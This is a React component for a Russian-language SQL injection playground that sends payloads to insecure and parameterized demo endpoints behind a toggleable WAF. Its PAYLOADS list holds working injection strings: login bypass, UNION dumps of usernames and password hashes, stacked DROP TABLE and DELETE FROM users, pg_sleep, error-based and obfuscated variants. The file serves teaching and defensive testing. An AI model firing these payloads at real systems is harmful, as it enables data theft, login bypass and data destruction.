import { useState } from 'react'
import { probe } from '../api.js'
import { WafChip } from '../components/Badges.jsx'

const PAYLOADS = [
  { group: 'Тавтологии (auth bypass)', items: [
    { target: 'search', label: "OR '1'='1", value: `' OR '1'='1` },
    { target: 'search', label: "zz%' OR '1'='1", value: `zz%' OR '1'='1` },
    { target: 'search', label: 'OR 1=1--', value: `zz%' OR 1=1--` },
    { target: 'login', label: "bypass: ' OR '1'='1' --", value: `' OR '1'='1' --`, password: 'x' },
    { target: 'login', label: "admin'--", value: `admin'--`, password: 'x' },
  ]},
  { group: 'UNION-based', items: [
    { target: 'search', label: 'UNION SELECT 1,2,3,4', value: `zz%' UNION SELECT 1,2,3,4--` },
    { target: 'search', label: 'Слить users (хэши паролей)', value: `zz%' UNION ALL SELECT id, username, password_hash, 1 FROM users--` },
    { target: 'search', label: 'Версия и имя БД', value: `zz' UNION SELECT NULL, version(), current_database(), NULL--` },
  ]},
  { group: 'Комментарии', items: [
    { target: 'search', label: "zz'--", value: `zz'--` },
    { target: 'search', label: 'zz /*tail', value: `zz' /*tail` },
    { target: 'search', label: "zz' #", value: `zz' #` },
  ]},
  { group: 'Stacked queries', items: [
    { target: 'search', label: '; DROP TABLE products', value: `zz'; DROP TABLE products--` },
    { target: 'search', label: '; DELETE FROM users', value: `zz'; DELETE FROM users--` },
    { target: 'search', label: '; SELECT 1', value: `zz'; SELECT 1--` },
  ]},
  { group: 'Time-based', items: [
    { target: 'search', label: 'pg_sleep(2) через AND', value: `zz%' AND (SELECT pg_sleep(2) IS NOT NULL) AND '1'='1` },
    { target: 'search', label: 'pg_sleep(2) в подзапросе', value: `zz' AND 1=(SELECT 1 FROM pg_sleep(2))--` },
  ]},
  { group: 'Error-based', items: [
    { target: 'search', label: 'cast ::int (ошибка типа)', value: `zz' AND (SELECT current_database())::int = 1--` },
    { target: 'search', label: 'CAST AS int', value: `zz%' AND 1=CAST((SELECT current_database()) AS int)--` },
    { target: 'search', label: '1/0 (деление на ноль)', value: `zz' AND 1=(SELECT 1/0)--` },
  ]},
  { group: 'Разведка', items: [
    { target: 'search', label: 'information_schema', value: `zz%' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns--` },
    { target: 'search', label: 'boolean blind (version)', value: `zz%' OR SUBSTRING(version(),1,1)='P'--` },
    { target: 'search', label: 'EXISTS (select)', value: `zz%' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--` },
  ]},
  { group: 'Обфускация', items: [
    { target: 'search', label: 'реГиСтр', value: `zz%' uNiOn SeLeCt 1,2,3,4--` },
    { target: 'search', label: 'UN/**/ION', value: `zz%' UN/**/ION SE/**/LECT 1,2,3,4--` },
    { target: 'search', label: 'URL-encode %27', value: `%27%20OR%20%271%27%3D%271` },
    { target: 'search', label: 'double encode %2527', value: `%2527%2520OR%2520%271%27%3D%271` },
  ]},
  { group: 'Легитимные (проверка ложных срабатываний)', items: [
    { target: 'search', label: 'ноутбук', value: `ноутбук` },
    { target: 'search', label: 'Logitech', value: `Logitech` },
    { target: 'search', label: 'SSD 1TB', value: `SSD 1TB` },
    { target: 'search', label: "O'Brien (апостроф!)", value: `O'Brien` },
    { target: 'login', label: 'admin / admin123 (корректно)', value: 'admin', password: 'admin123' },
  ]},
]

export default function Playground() {
  const [mode, setMode] = useState('insecure')
  const [waf, setWaf] = useState(true)
  const [tab, setTab] = useState('search')
  const [q, setQ] = useState('ноутбук')
  const [username, setUsername] = useState('admin')
  const [password, setPassword] = useState('admin123')
  const [result, setResult] = useState(null)
  const [busy, setBusy] = useState(false)
  const [history, setHistory] = useState([])

  async function run(kind, valueOverride, passwordOverride) {
    setBusy(true)
    try {
      const value = valueOverride ?? (kind === 'search' ? q : username)
      const path = kind === 'search' ? `/api/${mode}/search?q=${encodeURIComponent(value)}` : `/api/${mode}/login`
      const body = kind === 'search' ? null : { username: value, password: passwordOverride ?? password }
      const res = await probe({ path, method: kind === 'search' ? 'get' : 'post', data: body, waf })
      setResult({ ...res, kind, mode, waf, value })
      setHistory((prev) => [
        { ts: new Date().toLocaleTimeString('ru-RU'), kind, mode, waf, value, status: res.status, ms: res.ms, blocked: Boolean(res.data?.blocked) },
        ...prev,
      ].slice(0, 12))
    } finally {
      setBusy(false)
    }
  }

  function applyPayload(p) {
    if (p.target === 'search') {
      setTab('search')
      setQ(p.value)
      run('search', p.value)
    } else {
      setTab('login')
      setUsername(p.value)
      if (p.password) setPassword(p.password)
      run('login', p.value, p.password)
    }
  }

  const rows = result?.data?.rows || []
  const rowKeys = rows.length ? Object.keys(rows[0]) : []

  return (
    <div className="playground">
      <section className="panel">
        <div className="panel__head">
          <h1>Песочница атак (SQLi Playground)</h1>
          <p className="muted">
            Слева — цель и переключатели, снизу — готовые пейлоады. Сравните, как один и тот же ввод
            обрабатывается уязвимым (конкатенация строк) и защищённым (параметризация) эндпоинтом.
          </p>
        </div>

        <div className="controls">
          <div className="control">
            <label>Режим эндпоинта</label>
            <div className="segmented">
              <button className={mode === 'insecure' ? 'seg seg--on-danger' : 'seg'} onClick={() => setMode('insecure')}>
                ⛔ Insecure (уязвимый)
              </button>
              <button className={mode === 'secure' ? 'seg seg--on-safe' : 'seg'} onClick={() => setMode('secure')}>
                ✅ Secure (параметризованный)
              </button>
            </div>
          </div>
          <div className="control">
            <label>WAF-middleware</label>
            <button className={`toggle ${waf ? 'toggle--on' : ''}`} onClick={() => setWaf(!waf)} aria-pressed={waf}>
              <span className="toggle__knob" />
              <WafChip enabled={waf} />
            </button>
          </div>
          <div className="control control--grow">
            <label>Операция</label>
            <div className="segmented">
              <button className={tab === 'search' ? 'seg seg--on' : 'seg'} onClick={() => setTab('search')}>🔍 Поиск товаров</button>
              <button className={tab === 'login' ? 'seg seg--on' : 'seg'} onClick={() => setTab('login')}>🔑 Вход</button>
            </div>
          </div>
        </div>

        {tab === 'search' ? (
          <div className="form-row">
            <input
              className="input input--mono"
              value={q}
              onChange={(e) => setQ(e.target.value)}
              placeholder="Поисковый запрос (попробуйте ' OR '1'='1)"
              onKeyDown={(e) => e.key === 'Enter' && run('search')}
            />
            <button className="btn btn--primary" disabled={busy} onClick={() => run('search')}>
              {busy ? '…' : 'Отправить'}
            </button>
          </div>
        ) : (
          <div className="form-row">
            <input className="input input--mono" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="username" />
            <input className="input input--mono" type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="password" />
            <button className="btn btn--primary" disabled={busy} onClick={() => run('login')}>
              {busy ? '…' : 'Войти'}
            </button>
          </div>
        )}

        <div className="payload-groups">
          {PAYLOADS.map((g) => (
            <div className="payload-group" key={g.group}>
              <div className="payload-group__title">{g.group}</div>
              <div className="payload-group__items">
                {g.items.map((p) => (
                  <button
                    key={p.label}
                    className={`payload ${g.group.startsWith('Легитимные') ? 'payload--legit' : ''}`}
                    title={p.value}
                    disabled={busy}
                    onClick={() => applyPayload(p)}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>
      </section>

      <section className="panel">
        <div className="panel__head">
          <h2>Результат</h2>
          {result && (
            <div className="result-meta">
              <span className={`badge http-${String(result.status)[0]}`}>HTTP {result.status}</span>
              <WafChip enabled={result.waf} />
              <span className="chip">{result.mode}</span>
              <span className="chip">{result.ms} мс</span>
            </div>
          )}
        </div>

        {!result && <p className="muted">Отправьте запрос или нажмите готовый пейлоад слева.</p>}

        {result?.data?.blocked && (
          <div className="blocked-box">
            <b>🛡 WAF: запрос заблокирован (403)</b>
            <div>Правило: <code>{result.data.matched_rule}</code> · тип: {result.data.attack_type} · риск: {result.data.risk_level}</div>
            <div>Инцидент №{result.data.incident_id} создан в Security Dashboard</div>
            <div className="muted">Сработавший ввод: <code>{result.data.matched_value}</code></div>
          </div>
        )}

        {result?.data?.detail && !result.data.blocked && (
          <div className="error-box">Ошибка HTTP: {result.data.detail}</div>
        )}

        {result?.data?.sql && (
          <div className="sql-box">
            <div className="sql-box__label">Сгенерированный SQL{result.data.params ? ' (шаблон + параметры)' : ' (конкатенация строк!)'}</div>
            <pre>{result.data.sql}</pre>
            {result.data.params && <pre className="sql-params">{JSON.stringify(result.data.params)}</pre>}
          </div>
        )}

        {result?.data?.db_error && (
          <div className="error-box">
            <b>Ошибка СУБД (утечка внутренностей):</b>
            <pre>{result.data.db_error}</pre>
          </div>
        )}

        {result?.data?.authenticated !== undefined && (
          <div className={`auth-box ${result.data.authenticated ? 'auth-box--ok' : 'auth-box--fail'}`}>
            {result.data.authenticated
              ? <>🔓 Аутентификация пройдена: <b>{result.data.user?.username || result.data.user?.full_name}</b>{result.data.user?.role && <> (роль: {result.data.user.role})</>}</>
              : <>🔒 Доступ запрещён{result.data.reason && <> — причина: <code>{result.data.reason}</code></>}</>}
          </div>
        )}

        {rowKeys.length > 0 && (
          <div className="table-wrap">
            <table className="table">
              <thead>
                <tr>{rowKeys.map((k) => <th key={k}>{k}</th>)}</tr>
              </thead>
              <tbody>
                {rows.map((r, i) => (
                  <tr key={i}>
                    {rowKeys.map((k) => (
                      <td key={k} className={k === 'password_hash' || String(r[k]).startsWith('$2b$') ? 'leak' : ''}>
                        {String(r[k] ?? '')}
                      </td>
                    ))}
                  </tr>
                ))}
              </tbody>
            </table>
            <div className="muted small">Всего строк: {result.data.rows_count ?? rows.length}. Строки, похожие на хэши, выделены — это данные, слитые инъекцией.</div>
          </div>
        )}

        {result && rows.length === 0 && !result.data.db_error && !result.data.blocked && result.data.authenticated === undefined && (
          <p className="muted">Пустой результат (0 строк).</p>
        )}
      </section>

      {history.length > 0 && (
        <section className="panel">
          <div className="panel__head"><h2>История проб</h2></div>
          <div className="table-wrap">
            <table className="table table--compact">
              <thead><tr><th>время</th><th>операция</th><th>режим</th><th>WAF</th><th>ввод</th><th>HTTP</th><th>мс</th></tr></thead>
              <tbody>
                {history.map((h, i) => (
                  <tr key={i} className={h.blocked ? 'row-blocked' : ''}>
                    <td>{h.ts}</td><td>{h.kind}</td><td>{h.mode}</td><td>{h.waf ? 'ON' : 'OFF'}</td>
                    <td className="td-mono">{h.value.slice(0, 60)}</td>
                    <td>{h.status}</td><td>{h.ms}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}
    </div>
  )
}
